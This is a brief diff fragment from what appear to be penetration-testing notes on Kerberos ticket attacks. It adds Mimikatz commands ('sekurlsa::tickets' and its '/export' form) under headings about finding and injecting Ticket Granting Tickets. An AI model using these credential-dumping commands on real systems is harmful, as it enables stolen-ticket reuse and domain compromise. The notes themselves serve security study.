@@ -652,8 +652,20 @@ ntlmrelayx shell
 
 first check for Ticket Granting Ticket inside memory
 
+	sekurlsa::tickets
+	
+	
+	
+Export tickets
+
+	Sekurlsa::tickets /export
+
+
 
 inject TGT the memory
+
+
+
 
 
 check current tickets
